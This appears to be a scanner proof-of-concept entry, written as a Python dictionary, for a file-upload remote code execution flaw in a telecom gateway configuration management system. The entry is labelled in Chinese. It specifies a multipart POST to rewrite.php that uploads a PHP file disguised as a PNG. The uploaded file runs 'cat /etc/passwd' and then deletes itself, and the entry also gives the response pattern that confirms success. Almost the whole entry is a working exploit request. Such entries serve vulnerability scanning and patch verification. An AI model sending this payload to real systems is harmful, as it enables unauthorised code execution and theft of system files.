{
        'name': '电信网关配置管理系统 rewrite.php 文件上传致RCE漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/manager/teletext/material/rewrite.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT',
                'Connection': 'close'
            },
            'data': """------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name="tmp_name"; filename="test.php"\r\nContent-Type: image/png\r\n\r\n<?php system("cat /etc/passwd");unlink(__FILE__);?>\r\n------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name="uploadtime"\r\n\r\n\r\n------WebKitFormBoundaryOKldnDPT--""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'xmedia'
        }}]
    }